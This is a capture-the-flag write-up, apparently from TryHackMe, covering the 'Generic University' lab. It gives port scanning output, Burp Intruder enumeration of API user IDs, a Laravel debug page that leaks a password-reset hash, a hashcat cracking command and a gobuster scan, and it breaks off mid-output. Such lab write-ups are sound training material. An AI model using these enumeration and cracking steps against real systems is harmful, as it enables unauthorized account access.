# Generic University — Writeup

## Overview
### Generic University — Writeup
### Generic University — Writeup
----
API and Web testing room
---
![222](https://tryhackme-images.s3.amazonaws.com/room-icons/6a9730b73744a7e6af162994e74b2191.jpeg)
### Enroll today in Generic University
Start Machine
Generic University is an old, prestigious university with a long history dating back to 1066 where it was initially a training program for sheep dogs. Now it's a modern university with an old look. Our classes are very difficult and we aim to stress students out, very few of them pass their courses, but a grade higher than 90% is unheard of in our history. As the motto says "Inflict Pain"
Answer the questions below

## Enumeration
```json
┌──(witty㉿kali)-[~/Downloads]
└─$ rustscan -a 10.10.58.242 --ulimit 5500 -b 65535 -- -A -Pn
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Please contribute more quotes to our GitHub https://github.com/rustscan/rustscan

[~] The config file is expected to be at "/home/witty/.rustscan.toml"
[~] Automatically increasing ulimit value to 5500.
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
Open 10.10.58.242:22
Open 10.10.58.242:80
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
[~] Starting Nmap 7.93 ( https://nmap.org )
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE
Completed NSE
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE
Completed NSE
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE
Completed NSE
Initiating Parallel DNS resolution of 1 host.
Completed Parallel DNS resolution of 1 host.
DNS resolution of 1 IPs took 0.03s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan
Scanning 10.10.58.242 [2 ports]
Discovered open port 22/tcp on 10.10.58.242
Discovered open port 80/tcp on 10.10.58.242
Completed Connect Scan (2 total ports)
Initiating Service scan
Scanning 2 services on 10.10.58.242
Completed Service scan (2 services on 1 host)
NSE: Script scanning 10.10.58.242.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE
NSE Timing: About 99.29% done; ETC: 13:21 (0:00:00 remaining)
Completed NSE
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE
Completed NSE
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE
Completed NSE
Nmap scan report for 10.10.58.242
Host is up, received user-set (0.24s latency).

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 70121d390ed67fc141b548eb0b2edd09 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCoHAMCthJ4cP3O4erJuzYHPuzoQ9LOXObM/o5CQC3y5X/OcuTtAv2fujHQmn4odx9o5kUhB86cSXbykcwEPwFSxEYaYJ7ik+eQGt5idB3aUNBKkrl4nD8r6mdO2WQAxrrG9+9DVfN1XEAA/5g0rYlg9JdNlWFaaIKJOswF0dVBr+MGJr1Lre8fWI+t+f9piJYBkBh1N4FVnnYpP5W+PBqfYZ2XXT3u7x3Rt/SHFGXXXFQFcdDU1q5LSZuK/fvkrZS6uSQG0q+k3l/NKOa+m4nfw1IoxZXdztSbv4zKYJaCt8ICdtuOZuYjSlpGTeXvh3yvRNE3VVO3ZDa830ljic51
|   256 1bcd140ff67da0340dc07e3dff3458bc (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBEWW7wBgUUGJbtH8Nkovb7w5U6+Kfqzq6B1Ln1+TKfyfyVDOr1aXAHxfKwquqE/eElaXWdoNrT3VfCgkVT+wfqk=
|   256 b6732ab30c7e4dd4eb192f9cf79047e1 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJjrAQrvcGMb/vv+0Z5glOipNR+h1cSHZw7R2ZP2nc8P
80/tcp open  http    syn-ack Apache httpd 2.4.29
|_http-title: Generic University - View your Grades
|_http-favicon: Unknown favicon MD5: D41D8CD98F00B204E9800998ECF8427E
| http-methods: 
|_  Supported Methods: GET HEAD OPTIONS
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE
Completed NSE
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE
Completed NSE
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE
Completed NSE
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 57.53 seconds
```
What is the Generic University motto?
*Lorem Ipsum*
The API is currently in development and many of the API endpoints aren't publically accessible, use basic recon to find these hidden endpoints. Bare in mind this is a RESTful API.
Answer the questions below
```text
using burp intruder

REQUEST

GET /api/users/§0§ HTTP/1.1  (from 0 to 99 and found from 1 to 7 users)

RESPONSE

HTTP/1.1 200 OK

Date: Fri, 17 Mar 2023 17:32:34 GMT

Server: Apache/2.4.29 (Ubuntu)

Cache-Control: no-cache, private

Set-Cookie: XSRF-TOKEN=eyJp...3D; expires=Fri, 17-Mar-2023 19:32:39 GMT; Max-Age=7200; path=/; samesite=lax

Set-Cookie: laravel_session=ey...; expires=Fri, 17-Mar-2023 19:32:39 GMT; Max-Age=7200; path=/; httponly; samesite=lax

Content-Length: 191

Connection: close

Content-Type: application/json

users:

{"id":1,"name":"Javon Moen","email":"johnathon71@rolfson.com","email_verified_at":null,"created_at":"2022-04-06T09:34:55.000000Z","updated_at":"2022-04-06T09:34:55.000000Z","role_id":2}

{"id":2,"name":"Barbara Bauch","email":"pabshire@yahoo.com","email_verified_at":null,"created_at":"2022-04-06T09:34:55.000000Z","updated_at":"2022-04-06T09:34:55.000000Z","role_id":2}

{"id":3,"name":"Muriel Mante","email":"jgerlach@yahoo.com","email_verified_at":null,"created_at":"2022-04-06T09:34:55.000000Z","updated_at":"2022-04-06T09:34:55.000000Z","role_id":2}

{"id":4,"name":"Jalon Fisher","email":"tmiller@hotmail.com","email_verified_at":null,"created_at":"2022-04-06T09:34:55.000000Z","updated_at":"2022-04-06T09:34:55.000000Z","role_id":2}

{"id":5,"name":"Taya Kohler","email":"hspinka@yahoo.com","email_verified_at":null,"created_at":"2022-04-06T09:34:55.000000Z","updated_at":"2022-04-06T09:34:55.000000Z","role_id":2}

{"id":6,"name":"IT Nicola Langworth","email":"laura97@douglas.net","email_verified_at":null,"created_at":"2022-04-06T09:34:55.000000Z","updated_at":"2022-04-06T09:34:55.000000Z","role_id":1}

{"id":7,"name":"Dr Judge Klein","email":"milo.goyette@medhurst.com","email_verified_at":null,"created_at":"2022-04-06T09:34:55.000000Z","updated_at":"2022-04-06T09:34:55.000000Z","role_id":3}

now login

johnathon71@rolfson.com

forgot ur pass 

If i send to same email to get reset link
johnathon71@rolfson.com

gives me some error

Swift_TransportException
Connection could not be established with host smtp.mailtrap.io :stream_socket_client(): unable to connect to smtp.mailtrap.io:2525 (Connection timed out)
http://10.10.58.242/password/email 

Query

Query

    select
      *
    from
      `users`
    where
      `email` = ?
    limit
      1

Time
    157.88 
Connection name
    mysql 
0
    johnathon71@rolfson.com 

Query

Query

    select
      *
    from
      `password_resets`
    where
      `email` = ?
    limit
      1

Time
    319.75 
Connection name
    mysql 
0
    johnathon71@rolfson.com 

Query

Query

    delete from
      `password_resets`
    where
      `email` = ?

Time
    159.99 
Connection name
    mysql 
0
    johnathon71@rolfson.com 

Query

Query

    insert into
      `password_resets` (`email`, `token`, `created_at`)
    values
      (?, ?, ?)

Time
    154.41 
Connection name
    mysql 
0
    johnathon71@rolfson.com 
1
    $2y$10$/SIDNpN/lcL2Ow5fdH8BAefBj5BQDfhC7z.6lVD2/w.TKYTpUYVry 
2
    2023-03-17T17:34:56.306134Z 

now can see the pass

$2y$10$/SIDNpN/lcL2Ow5fdH8BAefBj5BQDfhC7z.6lVD2/w.TKYTpUYVry  (bcrypt 3200)

┌──(witty㉿kali)-[/tmp]
└─$ cat hash
$2y$10$/SIDNpN/lcL2Ow5fdH8BAefBj5BQDfhC7z.6lVD2/w.TKYTpUYVry

using hashcat

...

┌──(witty㉿kali)-[/tmp]
└─$ hashcat -m 3200 -a 0 hash /usr/share/wordlists/rockyou.txt 
hashcat (v6.2.6) starting

and wait...

https://github.com/InsiderPhD/Generic-University/blob/master/routes/web.php

┌──(witty㉿kali)-[~/Downloads]
└─$ gobuster dir -e -k -u http://10.10.58.242/api -w /usr/share/dirb/wordlists/common.txt 
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
